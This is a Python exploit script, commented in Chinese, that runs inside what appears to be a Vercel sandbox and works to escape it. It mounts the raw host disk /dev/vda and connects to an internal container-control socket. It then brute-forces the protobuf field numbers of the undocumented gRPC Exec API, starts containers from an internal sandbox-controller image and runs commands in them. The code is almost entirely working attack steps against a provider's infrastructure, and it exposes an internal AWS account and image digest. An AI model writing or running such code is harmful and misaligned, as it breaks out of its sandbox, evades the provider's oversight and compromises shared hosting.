# -*- coding: utf-8 -*-
"""vda24_field_enum: Exec 字段号离线枚举 + Create 保活终局 + 极速链路
P1: Exec 字段号枚举 (死容器): pstr(N,'ctr_x') N=1..8 -> 解析成功=非wire-format错误
P2: command 字段号枚举: pstr(cidN,cid)+pstr(M,'id') M=1..8
P3: Create attach/starttrue + Start + Wait 终局验证
P4: 极速链路: Create->Start->Exec(正确字段号)->processId->StreamOutput
输出落盘 + 哨兵 V24K_DONE"""
import os, time, socket, ctypes, re, struct

OUT = '/vercel/sandbox/v24k.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype, t=6, shutdown_wr=False, te=None):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        hdr = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n' % (path, ctype, len(body)))
        if te:
            hdr += 'TE: %s\r\n' % te
        hdr += '\r\n'
        s.sendall(hdr.encode() + body)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:1200].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def grpc_env(payload):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CSVC = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P1: Exec container_id 字段号枚举 (死容器即可 - wire 错误在反序列化阶段)
    log('=== P1 Exec cid field enum ===')
    fake = 'ctr_aaaaaaaaaaaaaaaaaaaaaaaaaaaa'
    cn_found = None
    for n in range(1, 10):
        st, bd = rpc_raw(sp, CSVC + '/Exec', grpc_env(pstr(n, fake)), 'application/grpc', t=4, shutdown_wr=True, te='trailers')
        if 'wire-format' in bd:
            tag = 'WIRE-ERR'
        elif bd:
            tag = 'PARSE-OK'
        else:
            tag = 'NORESP'
        log('exec field%-2d -> %s | %s' % (n, tag, bd[:200].replace('\n', ' ')))
        if tag != 'WIRE-ERR':
            cn_found = n
        time.sleep(0.2)
    if cn_found is None:
        log('NO cid field found, abort')
        log('V24K_DONE')
        f.close()
        return
    log('CID field = %d' % cn_found)

    # P2: Create 保活终局
    log('=== P2 Create keepalive final ===')
    ctrs = []
    for tag, body in [
        ('attach+cmd', '{"image":"%s","command":"/bin/sleep 300","attach":true}' % IMG),
        ('starttrue+cmd', '{"image":"%s","command":"/bin/sleep 300","start":true}' % IMG),
    ]:
        st, bd = rpc_raw(sp, CSVC + '/Create', body, 'application/json', t=30)
        m = re.search(r'"containerId":\s*"([^"]+)"', bd)
        if not m:
            log('create %-14s -> %s | %s' % (tag, st, bd[:200]))
            continue
        cid = m.group(1)
        log('create %-14s -> 200 CID=%s' % (tag, cid))
        ctrs.append((tag, cid))
        # 不 Start, 直接 Wait 看是否自动启动
        st, bd = rpc_raw(sp, CSVC + '/Wait', '{"container_id":"%s"}' % cid, 'application/json', t=3)
        log('  wait-no-start -> %s | %s [%s]' % (st, bd[:150], 'RUNNING?' if st == 'NORESP' else 'EXITED'))
        # 再 Start 一次
        st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid, 'application/json', t=6)
        log('  start -> %s | %s' % (st, bd[:150]))
        time.sleep(0.2)

    # P3: command 字段号枚举 (基于 cn_found, 用死容器)
    log('=== P3 Exec cmd field enum (cn=%d) ===' % cn_found)
    cid = ctrs[-1][1] if ctrs else fake
    mn_found = None
    for mn in range(1, 10):
        if mn == cn_found:
            continue
        payload = pstr(cn_found, cid) + pstr(mn, 'id')
        st, bd = rpc_raw(sp, CSVC + '/Exec', grpc_env(payload), 'application/grpc', t=4, shutdown_wr=True, te='trailers')
        if 'wire-format' in bd:
            tag = 'WIRE-ERR'
        elif bd:
            tag = 'PARSE-OK'
        else:
            tag = 'NORESP'
        log('cmd field%-2d -> %s | %s' % (mn, tag, bd[:200].replace('\n', ' ')))
        if tag != 'WIRE-ERR':
            mn_found = mn
            break
        time.sleep(0.2)
    if mn_found is None:
        log('NO cmd field found, abort')
        log('V24K_DONE')
        f.close()
        return
    log('CMD field = %d' % mn_found)

    # P4: 极速链路 (确认的组合)
    log('=== P4 fast chain (cn=%d mn=%d) ===' % (cn_found, mn_found))
    pid = None
    st, bd = rpc_raw(sp, CSVC + '/Create', '{"image":"%s","command":"/bin/sleep 300"}' % IMG,
                     'application/json', t=30)
    m = re.search(r'"containerId":\s*"([^"]+)"', bd)
    if m:
        c2 = m.group(1)
        log('CID=%s' % c2)
        st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % c2, 'application/json', t=6)
        log('start -> %s | %s' % (st, bd[:150]))
        payload = pstr(cn_found, c2) + pstr(mn_found, 'id')
        st, bd = rpc_raw(sp, CSVC + '/Exec', grpc_env(payload), 'application/grpc', t=8, shutdown_wr=True, te='trailers')
        log('exec -> %s | %s' % (st, bd[:400].replace('\n', ' ')))
        mm = re.search(r'"(?:processId|process_id)":\s*"([^"]+)"', bd)
        if mm:
            pid = mm.group(1)
            log('PID=%s' % pid)

    # P5: Process StreamOutput
    log('=== P5 Process StreamOutput ===')
    if pid:
        st, bd = rpc_raw(sp, PSVC + '/StreamOutput', grpc_env(pstr(1, pid) + pbool(2, True)),
                         'application/grpc', t=6, shutdown_wr=True, te='trailers')
        log('stream stdout -> %s | %s' % (st, bd[:600].replace('\n', ' ')))
    else:
        pid27 = 'hvcp_' + 'a' * 27
        st, bd = rpc_raw(sp, PSVC + '/StreamOutput', grpc_env(pstr(1, pid27) + pbool(2, True)),
                         'application/grpc', t=5, shutdown_wr=True, te='trailers')
        log('stream fake -> %s | %s' % (st, bd[:300].replace('\n', ' ')))

    # P6: Kill
    for tag, cc in ctrs:
        st, bd = rpc_raw(sp, CSVC + '/Kill', '{"container_id":"%s"}' % cc, 'application/json', t=4)
        log('kill %s -> %s | %s' % (tag, st, bd[:120]))

    log('V24K_DONE')
    f.close()


if __name__ == '__main__':
    main()
